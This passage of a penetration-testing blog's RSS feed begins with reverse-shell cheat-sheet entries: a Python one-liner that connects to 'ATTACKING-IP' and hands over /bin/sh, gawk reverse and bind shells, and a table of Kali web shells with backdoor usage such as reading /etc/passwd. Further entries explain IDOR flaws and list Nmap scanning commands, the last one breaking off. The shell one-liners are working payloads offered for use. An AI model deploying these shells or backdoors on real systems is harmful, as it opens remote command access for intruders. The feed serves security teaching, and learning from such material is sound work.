&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ATTACKING-IP&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;gawk-reverse-shell&quot;&gt;Gawk Reverse Shell&lt;/h2&gt;

&lt;p&gt;Gawk one liner rev shell by @dmfroberson:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-gawk&quot; data-lang=&quot;gawk&quot;&gt;gawk 'BEGIN {P=4444;S=&quot;&amp;gt; &quot;;H=&quot;192.168.1.100&quot;;V=&quot;/inet/tcp/0/&quot;H&quot;/&quot;P;while(1){do{printf S|&amp;amp;V;V|&amp;amp;getline c;if(c){while((c|&amp;amp;getline)&amp;gt;0)print $0|&amp;amp;V;close(c)}}while(c!=&quot;exit&quot;)close(V)}}'&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-gawk&quot; data-lang=&quot;gawk&quot;&gt;#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       &quot;bkd&amp;gt; &quot;

        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;
        while (1) {
                do {
                        printf Prompt |&amp;amp; Service
                        Service |&amp;amp; getline cmd
                        if (cmd) {
                                while ((cmd |&amp;amp; getline) &amp;gt; 0)
                                        print $0 |&amp;amp; Service
                                close(cmd)
                        }
                } while (cmd != &quot;exit&quot;)
                close(Service)
        }
}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;kali-web-shells&quot;&gt;Kali Web Shells&lt;/h2&gt;

&lt;p&gt;The following shells exist within Kali Linux, under &lt;code&gt;/usr/share/webshells/&lt;/code&gt; these are only useful if you are able to upload, inject or transfer the shell to the machine.&lt;/p&gt;

&lt;h3 id=&quot;kali-php-web-shells&quot;&gt;Kali PHP Web Shells&lt;/h3&gt;

&lt;p&gt;Kali PHP reverse shells and command shells:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/php/&lt;br /&gt;php-reverse-shell.php&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Pen Test Monkey - PHP Reverse Shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/&lt;br /&gt;php/php-findsock-shell.php&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/&lt;br /&gt;php/findsock.c&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Pen Test Monkey, Findsock Shell. Build &lt;code&gt;gcc -o findsock findsock.c&lt;/code&gt; (be mindfull of the target servers architecture), execute with netcat not a browser &lt;code&gt;nc -v target 80&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/&lt;br /&gt;php/simple-backdoor.php&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: &lt;code&gt;http://target.com/simple-&lt;br /&gt;backdoor.php?cmd=cat+/etc/passwd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/&lt;br /&gt;php/php-backdoor.php&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Larger PHP shell, with a text input box for command execution.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Tip: Executing Reverse Shells&lt;/h5&gt;
  &lt;p&gt;The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;kali-perl-reverse-shell&quot;&gt;Kali Perl Reverse Shell&lt;/h3&gt;

&lt;p&gt;Kali perl reverse shell:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/perl/&lt;br /&gt;perl-reverse-shell.pl&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Pen Test Monkey - Perl Reverse Shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/&lt;br /&gt;perl/perlcmd.cgi&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Pen Test Monkey, Perl Shell. Usage: &lt;code&gt;http://target.com/perlcmd.cgi?cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;kali-cold-fusion-shell&quot;&gt;Kali Cold Fusion Shell&lt;/h3&gt;

&lt;p&gt;Kali Coldfusion Shell:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/cfm/cfexec.cfm&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Cold Fusion Shell - aka CFM Shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;kali-asp-shell&quot;&gt;Kali ASP Shell&lt;/h3&gt;

&lt;p&gt;Classic ASP Reverse Shell + CMD shells:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/asp/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Kali ASP Shells&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;kali-aspx-shells&quot;&gt;Kali ASPX Shells&lt;/h3&gt;

&lt;p&gt;ASP.NET reverse shells within Kali:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/aspx/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Kali ASPX Shells&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;kali-jsp-reverse-shell&quot;&gt;Kali JSP Reverse Shell&lt;/h3&gt;

&lt;p&gt;Kali JSP Reverse Shell:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/usr/share/webshells/jsp/jsp-reverse.jsp&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Kali JSP Reverse Shell&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Insecure Direct Object Reference (IDOR): Definition, Examples &amp; How to Find</title>
          <link>https://highon.coffee/blog/insecure-direct-object-reference-idor/</link>
          <pubDate>Sun, 27 Feb 2022 01:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Web App Security</category>
          
          
          <category>Web App Security</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/insecure-direct-object-reference-idor/</guid>
          <description>&lt;h2 id=&quot;what-is-an-insecure-direct-object-reference-idor-vulnerability&quot;&gt;What is an Insecure Direct Object Reference (IDOR) Vulnerability?&lt;/h2&gt;

&lt;p&gt;What is a Insecure Direct Object Reference (IDOR) Vulnerability? In the most basic form an IDOR is an object referenced within a web appliation without the correct controls in place to prevent an unauthorised user directly access, either via enumeration or guessing / predicting the object. IDOR vulnerabilties typically occur when the access control mechanism uses a user-controlled parameter value, that is used to access functionality or reasources directly. Typically this uses a numeric or predictible parameter value, that an attacker or malicious user could predict, brute force and then manipulate to gain access to data and/or functionality that was not intended.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;How To Pronounce IDOR&lt;/h5&gt;
  &lt;p&gt;IDOR is typically pronounced &lt;i&gt;eye-door&lt;/i&gt; - this is arguably the most important piece of information in the whole document :)&lt;/p&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-an-insecure-direct-object-reference-idor-vulnerability&quot; id=&quot;markdown-toc-what-is-an-insecure-direct-object-reference-idor-vulnerability&quot;&gt;What is an Insecure Direct Object Reference (IDOR) Vulnerability?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insecure-direct-object-reference-idor-examples&quot; id=&quot;markdown-toc-insecure-direct-object-reference-idor-examples&quot;&gt;Insecure Direct Object Reference (IDOR) Examples&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#idor-example-direct-database-reference&quot; id=&quot;markdown-toc-idor-example-direct-database-reference&quot;&gt;IDOR Example: Direct Database Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#idor-example-file-name&quot; id=&quot;markdown-toc-idor-example-file-name&quot;&gt;IDOR Example: File Name&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-to-find-idor-vulnerabilties&quot; id=&quot;markdown-toc-how-to-find-idor-vulnerabilties&quot;&gt;How To Find IDOR Vulnerabilties&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#idor-entry-points&quot; id=&quot;markdown-toc-idor-entry-points&quot;&gt;IDOR Entry Points&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#idor-example-file-name-1&quot; id=&quot;markdown-toc-idor-example-file-name-1&quot;&gt;IDOR Example: File Name&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#finding-access-control-bug-idor&quot; id=&quot;markdown-toc-finding-access-control-bug-idor&quot;&gt;Finding Access Control Bug (IDOR)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#idor-vs-forced-browsing-whats-the-difference&quot; id=&quot;markdown-toc-idor-vs-forced-browsing-whats-the-difference&quot;&gt;IDOR vs Forced Browsing: What’s the Difference?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;insecure-direct-object-reference-idor-examples&quot;&gt;Insecure Direct Object Reference (IDOR) Examples&lt;/h2&gt;

&lt;p&gt;The following documents some IDOR examples, where the access control mechanism is vulnerable due to a user-controlled parameter value, that is used to access functionality or reasources directly. Typically a numeric or predictible parameter value, that an attacker or malicious user could manipulate.&lt;/p&gt;

&lt;h2 id=&quot;idor-example-direct-database-reference&quot;&gt;IDOR Example: Direct Database Reference&lt;/h2&gt;

&lt;p&gt;A typical numeric IDOR vulnerable function would look like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;foo.com/profile/user_id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7747&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_id&lt;/code&gt; parameter is vulnerable to IDOR an attacker could simply modify the numeric value and access another users profile. If successful an attacker could gain access to a user acverticalcount profile and potentially perform horizontal, or vertical privilege escalation against the vulnerable application.&lt;/p&gt;

&lt;h2 id=&quot;idor-example-file-name&quot;&gt;IDOR Example: File Name&lt;/h2&gt;

&lt;p&gt;Another typical example of an IDOR vulnerability would be file names with a predictable value that could be bruteforced, guessed or predicted if sequential, such as:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;foo.com/download/12432-secure-document.pdf &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the file name is vulnerable to IDOR an attacker could simply predict or bruteforce the numeric value and access another users file. If successful an attacker could potentially gain access to the document.&lt;/p&gt;

&lt;h2 id=&quot;how-to-find-idor-vulnerabilties&quot;&gt;How To Find IDOR Vulnerabilties&lt;/h2&gt;

&lt;p&gt;This document walks through some potential techniques on how to find IDOR vulnerabilities witin vulnerable web applications. Due to the manual process of building and implimenting access control systems, mistakes could be made (human error). Unfortunately, identifying IDOR vulnerabilities is typically best done manually.&lt;/p&gt;

&lt;h2 id=&quot;idor-entry-points&quot;&gt;IDOR Entry Points&lt;/h2&gt;

&lt;p&gt;Assess the application for predictable parameters or URL’s, some food for thought:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Profile URL’s or ID’s&lt;/li&gt;
  &lt;li&gt;Password reset functions (great for privilege escalation)&lt;/li&gt;
  &lt;li&gt;Numeric parameters&lt;/li&gt;
  &lt;li&gt;Predictable parameters&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;foo.com/profile/user_id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7747&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_id&lt;/code&gt; parameter is vulnerable to IDOR an attacker could simply modify the numeric value and access another users profile. If successful an attacker could gain access to a user acverticalcount profile and potentially perform horizontal, or vertical privilege escalation against the vulnerable application.&lt;/p&gt;

&lt;h2 id=&quot;idor-example-file-name-1&quot;&gt;IDOR Example: File Name&lt;/h2&gt;

&lt;p&gt;Another typical example of an IDOR vulnerability would be file names with a predictable value that could be bruteforced, guessed or predicted if sequential, such as:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;foo.com/download/12432-secure-document.pdf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the file name is vulnerable to IDOR an attacker could simply predict or bruteforce the numeric value and access another users file. If successful an attacker could potentially gain access to the document.&lt;/p&gt;

&lt;h2 id=&quot;finding-access-control-bug-idor&quot;&gt;Finding Access Control Bug (IDOR)&lt;/h2&gt;

&lt;p&gt;You could argue that strictly speaking this is not an IDOR bug, however (call it what you want to call it), either way it is still an issue.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Using BurpSuite or another similar tool, browse the application as a user or ideally a privileged user account&lt;/li&gt;
  &lt;li&gt;Authenticate as another user account, or an account with lower priveleges - and obtain a session identifier (token/cookie)&lt;/li&gt;
  &lt;li&gt;Use the session identifier obtained during step 2 against the URL’s from step 1&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Web Server Response Codes Lie&lt;/h5&gt;
  &lt;p&gt;Do not depend solely on response codes, many web applications respond with incorrect response codes.&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;idor-vs-forced-browsing-whats-the-difference&quot;&gt;IDOR vs Forced Browsing: What’s the Difference?&lt;/h2&gt;

&lt;p&gt;Forced browsing and IDOR vulnerabilties are very similar access control vulnerabilities. The main thing that seperates the vulnerabilties is the method of discovery is typically bruteforcing URL’s for forced browsing e.g. with a large word list and IDOR detection is typically discovered by brute forcing predicatable parameters.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Nmap Cheat Sheet: Commands &amp; Examples (2022)</title>
          <link>https://highon.coffee/blog/nmap-cheat-sheet/</link>
          <pubDate>Fri, 18 Feb 2022 10:37:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Penetration Testing</category>
          
          <category>Enumeration</category>
          
          <category>host-enum</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/nmap-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-command-examples&quot; id=&quot;markdown-toc-nmap-command-examples&quot;&gt;Nmap Command Examples&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-scan-from-file&quot; id=&quot;markdown-toc-nmap-scan-from-file&quot;&gt;Nmap scan from file&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-scan-all-ports&quot; id=&quot;markdown-toc-nmap-scan-all-ports&quot;&gt;Nmap Scan all Ports&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-output-formats&quot; id=&quot;markdown-toc-nmap-output-formats&quot;&gt;Nmap output formats&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-netbios-examples&quot; id=&quot;markdown-toc-nmap-netbios-examples&quot;&gt;Nmap Netbios Examples&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-nikto-scan&quot; id=&quot;markdown-toc-nmap-nikto-scan&quot;&gt;Nmap Nikto Scan&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-cheatsheet&quot; id=&quot;markdown-toc-nmap-cheatsheet&quot;&gt;Nmap Cheatsheet&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#target-specification&quot; id=&quot;markdown-toc-target-specification&quot;&gt;Target Specification&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#host-discovery&quot; id=&quot;markdown-toc-host-discovery&quot;&gt;Host Discovery&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#scan-techniques&quot; id=&quot;markdown-toc-scan-techniques&quot;&gt;Scan Techniques&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#port-specification-and-scan-order&quot; id=&quot;markdown-toc-port-specification-and-scan-order&quot;&gt;Port Specification and Scan Order&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-version-detection&quot; id=&quot;markdown-toc-service-version-detection&quot;&gt;Service Version Detection&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#script-scan&quot; id=&quot;markdown-toc-script-scan&quot;&gt;Script Scan&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#os-detection&quot; id=&quot;markdown-toc-os-detection&quot;&gt;OS Detection&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#timing-and-performance&quot; id=&quot;markdown-toc-timing-and-performance&quot;&gt;Timing and Performance&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#firewalls-ids-evasion-and-spoofing&quot; id=&quot;markdown-toc-firewalls-ids-evasion-and-spoofing&quot;&gt;Firewalls IDS Evasion and Spoofing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-output-options&quot; id=&quot;markdown-toc-nmap-output-options&quot;&gt;Nmap Output Options&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#misc-nmap-options&quot; id=&quot;markdown-toc-misc-nmap-options&quot;&gt;Misc Nmap Options&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-enumeration-examples&quot; id=&quot;markdown-toc-nmap-enumeration-examples&quot;&gt;Nmap Enumeration Examples&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enumerating-netbios&quot; id=&quot;markdown-toc-enumerating-netbios&quot;&gt;Enumerating Netbios&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan-optimisation&quot; id=&quot;markdown-toc-nmap-scan-optimisation&quot;&gt;Nmap Scan Optimisation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#nmap-rate&quot; id=&quot;markdown-toc-nmap-rate&quot;&gt;Nmap Rate&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#parallelism&quot; id=&quot;markdown-toc-parallelism&quot;&gt;Parallelism&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#host-group-sizes&quot; id=&quot;markdown-toc-host-group-sizes&quot;&gt;Host Group Sizes&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#host-timeout&quot; id=&quot;markdown-toc-host-timeout&quot;&gt;Host Timeout&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#scan-delay&quot; id=&quot;markdown-toc-scan-delay&quot;&gt;Scan Delay&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#disable-dns-lookups&quot; id=&quot;markdown-toc-disable-dns-lookups&quot;&gt;Disable DNS Lookups&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#nmap-black-list-detection&quot; id=&quot;markdown-toc-nmap-black-list-detection&quot;&gt;Nmap Black List Detection?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#optimising-portscans-for-targets&quot; id=&quot;markdown-toc-optimising-portscans-for-targets&quot;&gt;Optimising Portscans for Targets&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt; (network mapper), the god of port scanners used for network discovery and the basis for most security enumeration during the initial stages of a &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;penetration test&lt;/a&gt;. The tool was written and maintained by Fyodor AKA Gordon Lyon.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://nmap.org&quot;&gt;Nmap&lt;/a&gt; displays exposed services on a target machine along with other useful information such as the verion and OS detection.&lt;/p&gt;

&lt;p&gt;Nmap has made twelve movie appearances, including The Matrix Reloaded, Die Hard 4, Girl With the Dragon Tattoo, and The Bourne Ultimatum.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Original Post Date:&lt;/strong&gt; 13/12/2014 | 
&lt;strong&gt;Last Updated:&lt;/strong&gt; 18/02/2022&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/nmap-trinity.png&quot; alt=&quot;Nmap Trinity&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nmap in a nutshell&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Host discovery&lt;/li&gt;
  &lt;li&gt;Port discovery / enumeration&lt;/li&gt;
  &lt;li&gt;Service discovery&lt;/li&gt;
  &lt;li&gt;Operating system version detection&lt;/li&gt;
  &lt;li&gt;Hardware (MAC) address detection&lt;/li&gt;
  &lt;li&gt;Service version detection&lt;/li&gt;
  &lt;li&gt;Vulnerability / exploit detection, using Nmap scripts (NSE)&lt;/li&gt;
  &lt;li&gt;Nmap IDS / Portscan Detection &amp;amp; Scan Time Optimisation&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;nmap-command-examples&quot;&gt;Nmap Command Examples&lt;/h3&gt;

&lt;p&gt;Basic Nmap scanning examples, often used at the first stage of enumeration.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -sP 10.0.0.0/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Ping scans the network, listing machines that respond to ping.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -p 1-65535 -sV -sS -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Full TCP port scan using with service version detection - usually my first scan, I find T4 more accurate than T5 and still &quot;pretty quick&quot;.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sS -A -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + traceroute and scripts against target services.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sS -A -T5 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + traceroute and scripts against target services.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -sV -O -sS -T5 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -p 1-65535 -sV -O -sS -T4 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + full port range scan.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nmap -v -p 1-65535 -sV -O -sS -T5 target&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + full port range scan.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note info&quot;&gt;
